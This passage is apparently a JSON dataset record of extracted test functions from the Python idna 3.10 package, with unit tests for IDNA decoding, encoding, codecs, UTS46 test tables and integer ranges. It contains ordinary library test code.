\"\\u0434\\u043e\\u043c\\u0435\\u043d.\\u0438\\u0441\\u043f\\u044b\\u0442\\u0430\\u043d\\u0438\\u0435\",\n        )\n        if not skip_str:\n            self.assertEqual(\n                decode(\"\\u30c6\\u30b9\\u30c8.xn--zckzah\"),\n                \"\\u30c6\\u30b9\\u30c8.\\u30c6\\u30b9\\u30c8\",\n            )\n            self.assertEqual(\n                decode(\"\\u30c6\\u30b9\\u30c8.\\u30c6\\u30b9\\u30c8\"),\n                \"\\u30c6\\u30b9\\u30c8.\\u30c6\\u30b9\\u30c8\",\n            )\n            self.assertEqual(decode(\"abc.abc\"), \"abc.abc\")\n        self.assertEqual(\n            decode(b\"xn---------90gglbagaar.aa\"),\n            \"\\u0521\\u0525\\u0523-\\u0523\\u0523-----\\u0521\\u0523\\u0523\\u0523.aa\",\n        )\n        self.assertRaises(idna.IDNAError, decode, b\"XN---------90GGLBAGAAC.AA\")\n        self.assertRaises(idna.IDNAError, decode, b\"xn---------90gglbagaac.aa\")\n        self.assertRaises(idna.IDNAError, decode, b\"xn--\")\n        self.assertRaises(idna.IDNAError, decode, b\"\\x8d\\xd2\")\n        self.assertRaises(\n            idna.IDNAError,\n            decode,\n            b\"A.A.0.a.a.A.0.a.A.A.0.a.A.0A.2.a.A.A.0.a.A.0.A.a.A0.a.a.A.0.a.fB.A.A.a.A.A.B.A.A.a.A.A.B.A.A.a.A.A.0.a.A.a.a.A.A.0.a.A.0.A.a.A0.a.a.A.0.a.fB.A.A.a.A.A.B.0A.A.a.A.A.B.A.A.a.A.A.a.A.A.B.A.A.a.A.0.a.B.A.A.a.A.B.A.a.A.A.5.a.A.0.a.Ba.A.B.A.A.a.A.0.a.Xn--B.A.A.A.a\",\n        )\n        self.assertRaises(idna.IDNAError, decode, b\"xn--ukba655qaaaa14431eeaaba.c\")\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_uts46.py (function)\ndef unicode_fixup(string):\n    \"\"\"Replace backslash-u-XXXX with appropriate unicode characters.\"\"\"\n    return _RE_SURROGATE.sub(\n        lambda match: chr((ord(match.group(0)[0]) - 0xD800) * 0x400 + ord(match.group(0)[1]) - 0xDC00 + 0x10000),\n        _RE_UNICODE.sub(lambda match: chr(int(match.group(1), 16)), string),\n    )\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_uts46.py (function)\ndef parse_idna_test_table(inputstream):\n    \"\"\"Parse IdnaTestV2.txt and return a list of tuples.\"\"\"\n    for lineno, line in enumerate(inputstream):\n        line = line.decode(\"utf-8\").strip()\n        if \"#\" in line:\n            line = line.split(\"#\", 1)[0]\n        if not line:\n            continue\n        yield ((lineno + 1, tuple(field.strip() for field in line.split(\";\"))))\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_uts46.py (class)\nclass TestIdnaTest(unittest.TestCase):\n    \"\"\"Run one of the IdnaTestV2.txt test lines.\"\"\"\n\n    def __init__(self, lineno=None, fields=None):\n        super().__init__()\n        self.lineno = lineno\n        self.fields = fields\n\n    def id(self):\n        return \"{}.{}\".format(super().id(), self.lineno)\n\n    def shortDescription(self):\n        if not self.fields:\n            return \"\"\n        return \"IdnaTestV2.txt line {}: {}\".format(self.lineno, \"; \".join(self.fields))\n\n    def runTest(self):\n        if not self.fields:\n            return\n        (\n            source,\n            to_unicode,\n            to_unicode_status,\n            to_ascii,\n            to_ascii_status,\n            to_ascii_t,\n            to_ascii_t_status,\n        ) = self.fields\n        if source in _SKIP_TESTS:\n            return\n        if not to_unicode:\n            to_unicode = source\n        if not to_unicode_status:\n            to_unicode_status = \"[]\"\n        if not to_ascii:\n            to_ascii = to_unicode\n        if not to_ascii_status:\n            to_ascii_status = to_unicode_status\n        if not to_ascii_t:\n            to_ascii_t = to_ascii\n        if not to_ascii_t_status:\n            to_ascii_t_status = to_ascii_status\n\n        try:\n            output = idna.decode(source, uts46=True, strict=True)\n            if to_unicode_status != \"[]\":\n                self.fail(\"decode() did not emit required error {} for {}\".format(to_unicode, repr(source)))\n            self.assertEqual(output, to_unicode, \"unexpected decode() output\")\n        except (idna.IDNAError, UnicodeError, ValueError) as exc:\n            if str(exc).startswith(\"Unknown\"):\n                raise unittest.SkipTest(\"Test requires support for a newer\" \" version of Unicode than this Python supports\")\n            if to_unicode_status == \"[]\":\n                raise\n\n        try:\n            output = idna.encode(source, uts46=True, strict=True).decode(\"ascii\")\n            if to_ascii_status != \"[]\":\n                self.fail(\"encode() did not emit required error {} for {}\".format(to_ascii_status, repr(source)))\n            self.assertEqual(output, to_ascii, \"unexpected encode() output\")\n        except (idna.IDNAError, UnicodeError, ValueError) as exc:\n            if str(exc).startswith(\"Unknown\"):\n                raise unittest.SkipTest(\"Test requires support for a newer\" \" version of Unicode than this Python supports\")\n            if to_ascii_status == \"[]\":\n                raise\n\n        try:\n            output = idna.encode(source, uts46=True, strict=True, transitional=True).decode(\"ascii\")\n            if to_ascii_t_status != \"[]\":\n                self.fail(\n                    \"encode(transitional=True) did not emit required error {} for {}\".format(to_ascii_t_status, repr(source))\n                )\n            self.assertEqual(output, to_ascii_t, \"unexpected encode() output\")\n        except (idna.IDNAError, UnicodeError, ValueError) as exc:\n            if str(exc).startswith(\"Unknown\"):\n                raise unittest.SkipTest(\"Test requires support for a newer\" \" version of Unicode than this Python supports\")\n            if to_ascii_t_status == \"[]\":\n                raise\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_uts46.py (function)\ndef load_tests(loader, tests, pattern):\n    \"\"\"Create a suite of all the individual tests.\"\"\"\n    suite = unittest.TestSuite()\n    with open(os.path.join(os.path.dirname(__file__), \"IdnaTestV2.txt\"), \"rb\") as tests_file:\n        suite.addTests(TestIdnaTest(lineno, fields) for lineno, fields in parse_idna_test_table(tests_file))\n    return suite\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_uts46.py (function)\ndef __init__(self, lineno=None, fields=None):\n        super().__init__()\n        self.lineno = lineno\n        self.fields = fields\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_uts46.py (function)\ndef id(self):\n        return \"{}.{}\".format(super().id(), self.lineno)\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_uts46.py (function)\ndef shortDescription(self):\n        if not self.fields:\n            return \"\"\n        return \"IdnaTestV2.txt line {}: {}\".format(self.lineno, \"; \".join(self.fields))\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_uts46.py (function)\ndef runTest(self):\n        if not self.fields:\n            return\n        (\n            source,\n            to_unicode,\n            to_unicode_status,\n            to_ascii,\n            to_ascii_status,\n            to_ascii_t,\n            to_ascii_t_status,\n        ) = self.fields\n        if source in _SKIP_TESTS:\n            return\n        if not to_unicode:\n            to_unicode = source\n        if not to_unicode_status:\n            to_unicode_status = \"[]\"\n        if not to_ascii:\n            to_ascii = to_unicode\n        if not to_ascii_status:\n            to_ascii_status = to_unicode_status\n        if not to_ascii_t:\n            to_ascii_t = to_ascii\n        if not to_ascii_t_status:\n            to_ascii_t_status = to_ascii_status\n\n        try:\n            output = idna.decode(source, uts46=True, strict=True)\n            if to_unicode_status != \"[]\":\n                self.fail(\"decode() did not emit required error {} for {}\".format(to_unicode, repr(source)))\n            self.assertEqual(output, to_unicode, \"unexpected decode() output\")\n        except (idna.IDNAError, UnicodeError, ValueError) as exc:\n            if str(exc).startswith(\"Unknown\"):\n                raise unittest.SkipTest(\"Test requires support for a newer\" \" version of Unicode than this Python supports\")\n            if to_unicode_status == \"[]\":\n                raise\n\n        try:\n            output = idna.encode(source, uts46=True, strict=True).decode(\"ascii\")\n            if to_ascii_status != \"[]\":\n                self.fail(\"encode() did not emit required error {} for {}\".format(to_ascii_status, repr(source)))\n            self.assertEqual(output, to_ascii, \"unexpected encode() output\")\n        except (idna.IDNAError, UnicodeError, ValueError) as exc:\n            if str(exc).startswith(\"Unknown\"):\n                raise unittest.SkipTest(\"Test requires support for a newer\" \" version of Unicode than this Python supports\")\n            if to_ascii_status == \"[]\":\n                raise\n\n        try:\n            output = idna.encode(source, uts46=True, strict=True, transitional=True).decode(\"ascii\")\n            if to_ascii_t_status != \"[]\":\n                self.fail(\n                    \"encode(transitional=True) did not emit required error {} for {}\".format(to_ascii_t_status, repr(source))\n                )\n            self.assertEqual(output, to_ascii_t, \"unexpected encode() output\")\n        except (idna.IDNAError, UnicodeError, ValueError) as exc:\n            if str(exc).startswith(\"Unknown\"):\n                raise unittest.SkipTest(\"Test requires support for a newer\" \" version of Unicode than this Python supports\")\n            if to_ascii_t_status == \"[]\":\n                raise\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_codec.py (class)\nclass IDNACodecTests(unittest.TestCase):\n    def setUp(self):\n        from . import test_idna\n\n        self.idnatests = test_idna.IDNATests()\n        self.idnatests.setUp()\n\n    def testCodec(self):\n        self.assertIs(codecs.lookup(CODEC_NAME).incrementalencoder, idna.codec.IncrementalEncoder)\n\n    def testDirectDecode(self):\n        self.idnatests.test_decode(decode=lambda obj: codecs.decode(obj, CODEC_NAME))\n\n    def testIndirectDecode(self):\n        self.idnatests.test_decode(decode=lambda obj: obj.decode(CODEC_NAME), skip_str=True)\n\n    def testDirectEncode(self):\n        self.idnatests.test_encode(encode=lambda obj: codecs.encode(obj, CODEC_NAME))\n\n    def testIndirectEncode(self):\n        self.idnatests.test_encode(encode=lambda obj: obj.encode(CODEC_NAME), skip_bytes=True)\n\n    def testStreamReader(self):\n        def decode(obj):\n            if isinstance(obj, str):\n                obj = bytes(obj, \"ascii\")\n            buffer = io.BytesIO(obj)\n            stream = codecs.getreader(CODEC_NAME)(buffer)\n            return stream.read()\n\n        return self.idnatests.test_decode(decode=decode, skip_str=True)\n\n    def testStreamWriter(self):\n        def encode(obj):\n            buffer = io.BytesIO()\n            stream = codecs.getwriter(CODEC_NAME)(buffer)\n            stream.write(obj)\n            stream.flush()\n            return buffer.getvalue()\n\n        return self.idnatests.test_encode(encode=encode)\n\n    def testIncrementalDecoder(self):\n        # Tests derived from Python standard library test/test_codecs.py\n\n        incremental_tests = (\n            (\"python.org\", b\"python.org\"),\n            (\"python.org.\", b\"python.org.\"),\n            (\"pyth\\xf6n.org\", b\"xn--pythn-mua.org\"),\n            (\"pyth\\xf6n.org.\", b\"xn--pythn-mua.org.\"),\n        )\n\n        for decoded, encoded in incremental_tests:\n            self.assertEqual(\n                \"\".join(codecs.iterdecode((bytes([c]) for c in encoded), CODEC_NAME)),\n                decoded,\n            )\n\n        decoder = codecs.getincrementaldecoder(CODEC_NAME)()\n        self.assertEqual(\n            decoder.decode(\n                b\"xn--xam\",\n            ),\n            \"\",\n        )\n        self.assertEqual(\n            decoder.decode(\n                b\"ple-9ta.o\",\n            ),\n            \"\\xe4xample.\",\n        )\n        self.assertEqual(decoder.decode(b\"rg\"), \"\")\n        self.assertEqual(decoder.decode(b\"\", True), \"org\")\n\n        decoder.reset()\n        self.assertEqual(\n            decoder.decode(\n                b\"xn--xam\",\n            ),\n            \"\",\n        )\n        self.assertEqual(\n            decoder.decode(\n                b\"ple-9ta.o\",\n            ),\n            \"\\xe4xample.\",\n        )\n        self.assertEqual(decoder.decode(b\"rg.\"), \"org.\")\n        self.assertEqual(decoder.decode(b\"\", True), \"\")\n\n    def testIncrementalEncoder(self):\n        # Tests derived from Python standard library test/test_codecs.py\n\n        incremental_tests = (\n            (\"python.org\", b\"python.org\"),\n            (\"python.org.\", b\"python.org.\"),\n            (\"pyth\\xf6n.org\", b\"xn--pythn-mua.org\"),\n            (\"pyth\\xf6n.org.\", b\"xn--pythn-mua.org.\"),\n        )\n        for decoded, encoded in incremental_tests:\n            self.assertEqual(b\"\".join(codecs.iterencode(decoded, CODEC_NAME)), encoded)\n\n        encoder = codecs.getincrementalencoder(CODEC_NAME)()\n        self.assertEqual(encoder.encode(\"\\xe4x\"), b\"\")\n        self.assertEqual(encoder.encode(\"ample.org\"), b\"xn--xample-9ta.\")\n        self.assertEqual(encoder.encode(\"\", True), b\"org\")\n\n        encoder.reset()\n        self.assertEqual(encoder.encode(\"\\xe4x\"), b\"\")\n        self.assertEqual(encoder.encode(\"ample.org.\"), b\"xn--xample-9ta.org.\")\n        self.assertEqual(encoder.encode(\"\", True), b\"\")\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_codec.py (function)\ndef setUp(self):\n        from . import test_idna\n\n        self.idnatests = test_idna.IDNATests()\n        self.idnatests.setUp()\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_codec.py (function)\ndef testCodec(self):\n        self.assertIs(codecs.lookup(CODEC_NAME).incrementalencoder, idna.codec.IncrementalEncoder)\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_codec.py (function)\ndef testDirectDecode(self):\n        self.idnatests.test_decode(decode=lambda obj: codecs.decode(obj, CODEC_NAME))\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_codec.py (function)\ndef testIndirectDecode(self):\n        self.idnatests.test_decode(decode=lambda obj: obj.decode(CODEC_NAME), skip_str=True)\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_codec.py (function)\ndef testDirectEncode(self):\n        self.idnatests.test_encode(encode=lambda obj: codecs.encode(obj, CODEC_NAME))\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_codec.py (function)\ndef testIndirectEncode(self):\n        self.idnatests.test_encode(encode=lambda obj: obj.encode(CODEC_NAME), skip_bytes=True)\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_codec.py (function)\ndef testStreamReader(self):\n        def decode(obj):\n            if isinstance(obj, str):\n                obj = bytes(obj, \"ascii\")\n            buffer = io.BytesIO(obj)\n            stream = codecs.getreader(CODEC_NAME)(buffer)\n            return stream.read()\n\n        return self.idnatests.test_decode(decode=decode, skip_str=True)\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_codec.py (function)\ndef testStreamWriter(self):\n        def encode(obj):\n            buffer = io.BytesIO()\n            stream = codecs.getwriter(CODEC_NAME)(buffer)\n            stream.write(obj)\n            stream.flush()\n            return buffer.getvalue()\n\n        return self.idnatests.test_encode(encode=encode)\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_codec.py (function)\ndef testIncrementalDecoder(self):\n        # Tests derived from Python standard library test/test_codecs.py\n\n        incremental_tests = (\n            (\"python.org\", b\"python.org\"),\n            (\"python.org.\", b\"python.org.\"),\n            (\"pyth\\xf6n.org\", b\"xn--pythn-mua.org\"),\n            (\"pyth\\xf6n.org.\", b\"xn--pythn-mua.org.\"),\n        )\n\n        for decoded, encoded in incremental_tests:\n            self.assertEqual(\n                \"\".join(codecs.iterdecode((bytes([c]) for c in encoded), CODEC_NAME)),\n                decoded,\n            )\n\n        decoder = codecs.getincrementaldecoder(CODEC_NAME)()\n        self.assertEqual(\n            decoder.decode(\n                b\"xn--xam\",\n            ),\n            \"\",\n        )\n        self.assertEqual(\n            decoder.decode(\n                b\"ple-9ta.o\",\n            ),\n            \"\\xe4xample.\",\n        )\n        self.assertEqual(decoder.decode(b\"rg\"), \"\")\n        self.assertEqual(decoder.decode(b\"\", True), \"org\")\n\n        decoder.reset()\n        self.assertEqual(\n            decoder.decode(\n                b\"xn--xam\",\n            ),\n            \"\",\n        )\n        self.assertEqual(\n            decoder.decode(\n                b\"ple-9ta.o\",\n            ),\n            \"\\xe4xample.\",\n        )\n        self.assertEqual(decoder.decode(b\"rg.\"), \"org.\")\n        self.assertEqual(decoder.decode(b\"\", True), \"\")\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_codec.py (function)\ndef testIncrementalEncoder(self):\n        # Tests derived from Python standard library test/test_codecs.py\n\n        incremental_tests = (\n            (\"python.org\", b\"python.org\"),\n            (\"python.org.\", b\"python.org.\"),\n            (\"pyth\\xf6n.org\", b\"xn--pythn-mua.org\"),\n            (\"pyth\\xf6n.org.\", b\"xn--pythn-mua.org.\"),\n        )\n        for decoded, encoded in incremental_tests:\n            self.assertEqual(b\"\".join(codecs.iterencode(decoded, CODEC_NAME)), encoded)\n\n        encoder = codecs.getincrementalencoder(CODEC_NAME)()\n        self.assertEqual(encoder.encode(\"\\xe4x\"), b\"\")\n        self.assertEqual(encoder.encode(\"ample.org\"), b\"xn--xample-9ta.\")\n        self.assertEqual(encoder.encode(\"\", True), b\"org\")\n\n        encoder.reset()\n        self.assertEqual(encoder.encode(\"\\xe4x\"), b\"\")\n        self.assertEqual(encoder.encode(\"ample.org.\"), b\"xn--xample-9ta.org.\")\n        self.assertEqual(encoder.encode(\"\", True), b\"\")\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_codec.py (function)\ndef decode(obj):\n            if isinstance(obj, str):\n                obj = bytes(obj, \"ascii\")\n            buffer = io.BytesIO(obj)\n            stream = codecs.getreader(CODEC_NAME)(buffer)\n            return stream.read()\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_codec.py (function)\ndef encode(obj):\n            buffer = io.BytesIO()\n            stream = codecs.getwriter(CODEC_NAME)(buffer)\n            stream.write(obj)\n            stream.flush()\n            return buffer.getvalue()\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_compat.py (class)\nclass IDNACompatTests(unittest.TestCase):\n    def testToASCII(self):\n        self.assertEqual(\n            idna.compat.ToASCII(\"\\u30c6\\u30b9\\u30c8.xn--zckzah\"),\n            b\"xn--zckzah.xn--zckzah\",\n        )\n\n    def testToUnicode(self):\n        self.assertEqual(\n            idna.compat.ToUnicode(b\"xn--zckzah.xn--zckzah\"),\n            \"\\u30c6\\u30b9\\u30c8.\\u30c6\\u30b9\\u30c8\",\n        )\n\n    def test_nameprep(self):\n        self.assertRaises(NotImplementedError, idna.compat.nameprep, \"a\")\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_compat.py (function)\ndef testToASCII(self):\n        self.assertEqual(\n            idna.compat.ToASCII(\"\\u30c6\\u30b9\\u30c8.xn--zckzah\"),\n            b\"xn--zckzah.xn--zckzah\",\n        )\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_compat.py (function)\ndef testToUnicode(self):\n        self.assertEqual(\n            idna.compat.ToUnicode(b\"xn--zckzah.xn--zckzah\"),\n            \"\\u30c6\\u30b9\\u30c8.\\u30c6\\u30b9\\u30c8\",\n        )\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_compat.py (function)\ndef test_nameprep(self):\n        self.assertRaises(NotImplementedError, idna.compat.nameprep, \"a\")\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_other.py (class)\nclass OtherUTS46Tests(unittest.TestCase):\n    def test_std3(self):\n        self.assertEqual(idna.uts46_remap(\"A_\", std3_rules=False), \"a_\")\n        self.assertRaises(idna.InvalidCodepoint, idna.uts46_remap, \"A_\", std3_rules=True)\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_other.py (function)\ndef test_std3(self):\n        self.assertEqual(idna.uts46_remap(\"A_\", std3_rules=False), \"a_\")\n        self.assertRaises(idna.InvalidCodepoint, idna.uts46_remap, \"A_\", std3_rules=True)\n==================================================\n\n# File: data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_intranges.py (class)\nclass IntrangeTests(unittest.TestCase):\n    def test_ranging(self):\n        self.assertEqual(\n            intranges_from_list(list(range(293, 499)) + list(range(4888, 9876))),\n            (\n                _encode_range(293, 499),\n                _encode_range(4888, 9876),\n            ),\n        )\n\n    def test_ranging_2(self):\n        self.assertEqual(intranges_from_list([111]), (_encode_range(111, 112),))\n\n    def test_skips(self):\n        self.assertEqual(\n            intranges_from_list(\n                [\n                    0,\n                    2,\n                    4,\n                    6,\n                    9,\n                    10,\n                    11,\n                    13,\n                    15,\n                ]\n            ),\n            (\n                _encode_range(0, 1),\n                _encode_range(",
      "file_paths": [
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_uts46.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_uts46.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_uts46.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_uts46.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_uts46.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_uts46.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_uts46.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_uts46.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_codec.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_codec.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_codec.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_codec.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_codec.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_codec.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_codec.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_codec.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_codec.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_codec.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_codec.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_codec.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_codec.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_compat.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_compat.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_compat.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_compat.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_other.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_other.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_intranges.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_intranges.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_intranges.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_intranges.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_intranges.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_intranges.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_intranges.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_intranges.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_intranges.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_intranges.py",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_intranges.py"
      ],
      "individual_files": {
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna.py": "def test_decode(self, decode=None, skip_str=False):\n        if decode is None:\n            decode = idna.decode\n        self.assertEqual(decode(b\"xn--zckzah.xn--zckzah\"), \"\\u30c6\\u30b9\\u30c8.\\u30c6\\u30b9\\u30c8\")\n        self.assertEqual(\n            decode(b\"xn--d1acufc.xn--80akhbyknj4f\"),\n            \"\\u0434\\u043e\\u043c\\u0435\\u043d.\\u0438\\u0441\\u043f\\u044b\\u0442\\u0430\\u043d\\u0438\\u0435\",\n        )\n        if not skip_str:\n            self.assertEqual(\n                decode(\"\\u30c6\\u30b9\\u30c8.xn--zckzah\"),\n                \"\\u30c6\\u30b9\\u30c8.\\u30c6\\u30b9\\u30c8\",\n            )\n            self.assertEqual(\n                decode(\"\\u30c6\\u30b9\\u30c8.\\u30c6\\u30b9\\u30c8\"),\n                \"\\u30c6\\u30b9\\u30c8.\\u30c6\\u30b9\\u30c8\",\n            )\n            self.assertEqual(decode(\"abc.abc\"), \"abc.abc\")\n        self.assertEqual(\n            decode(b\"xn---------90gglbagaar.aa\"),\n            \"\\u0521\\u0525\\u0523-\\u0523\\u0523-----\\u0521\\u0523\\u0523\\u0523.aa\",\n        )\n        self.assertRaises(idna.IDNAError, decode, b\"XN---------90GGLBAGAAC.AA\")\n        self.assertRaises(idna.IDNAError, decode, b\"xn---------90gglbagaac.aa\")\n        self.assertRaises(idna.IDNAError, decode, b\"xn--\")\n        self.assertRaises(idna.IDNAError, decode, b\"\\x8d\\xd2\")\n        self.assertRaises(\n            idna.IDNAError,\n            decode,\n            b\"A.A.0.a.a.A.0.a.A.A.0.a.A.0A.2.a.A.A.0.a.A.0.A.a.A0.a.a.A.0.a.fB.A.A.a.A.A.B.A.A.a.A.A.B.A.A.a.A.A.0.a.A.a.a.A.A.0.a.A.0.A.a.A0.a.a.A.0.a.fB.A.A.a.A.A.B.0A.A.a.A.A.B.A.A.a.A.A.a.A.A.B.A.A.a.A.0.a.B.A.A.a.A.B.A.a.A.A.5.a.A.0.a.Ba.A.B.A.A.a.A.0.a.Xn--B.A.A.A.a\",\n        )\n        self.assertRaises(idna.IDNAError, decode, b\"xn--ukba655qaaaa14431eeaaba.c\")",
        "data/benign_samples/pypi/popular/idna/3.10/idna-3.10/tests/test_idna_uts46.py": "def runTest(self):\n        if not self.fields:\n            return\n        (\n            source,\n            to_unicode,\n            to_unicode_status,\n            to_ascii,\n            to_ascii_status,\n            to_ascii_t,\n            to_ascii_t_status,\n        ) = self.fields\n        if source in _SKIP_TESTS:\n            return\n        if not to_unicode:\n            to_unicode = source\n        if not to_unicode_status:\n            to_unicode_status = \"[]\"\n        if not to_ascii:\n            to_ascii = to_unicode\n        if not to_ascii_status:\n            to_ascii_status = to_unicode_status\n        if not to_ascii_t:\n            to_ascii_t = to_ascii\n        if not to_ascii_t_status:\n            to_ascii_t_status = to_ascii_status\n\n        try:\n            output = idna.decode(source, uts46=True, strict=True)\n            if to_unicode_status != \"[]\":\n                self.fail(\"decode() did not emit required error {} for {}\".format(to_unicode, repr(source)))\n            self.assertEqual(output, to_unicode, \"unexpected decode() output\")\n        except (idna.IDNAError, UnicodeError, ValueError) as exc:\n            if str(exc).startswith(\"Unknown\"):\n                raise unittest.SkipTest(\"Test requires support for a newer\" \" version of Unicode than this Python supports\")\n            if to_unicode_status == \"[]\":\n                raise\n\n        try:\n            output = idna.encode(source, uts46=True, strict=True).decode(\"ascii\")\n            if to_ascii_status != \"[]\":\n                self.fail(\"encode() did not emit required error {} for {}\".format(to_ascii_status, repr(source)))\n            self.assertEqual(output, to_ascii, \"unexpected encode() output\")\n        except (idna.IDNAError, UnicodeError, ValueError) as exc:\n            if str(exc).startswith(\"Unknown\"):\n                raise unittest.SkipTest(\"Test requires support for a newer\" \" version of Unicode than this Python supports\")\n            if to_ascii_status == \"[]\":\n                raise\n\n        try:\n            output = idna.encode(source, uts46=True, strict=True, transitional=True).decode(\"ascii\")\n            if to_ascii_t_status != \"[]\":\n                self.fail(\n                    \"encode(transitional=True) did not emit required error {} for {}\".format(to_ascii_t_status, repr(source))\n                )\n            self.assertEqual(output, to_ascii_t, \"unexpected encode() output\")\n        except (idna.IDNAError, UnicodeError, ValueError) as exc:\n            if str(exc).startswith(\"Unknown\"):\n                raise unittest.SkipTest(\"Test requires support for a newer\" \" version of Unicode than this Python supports\")\n            if to_ascii_t_status == \"[]\":\n                raise",
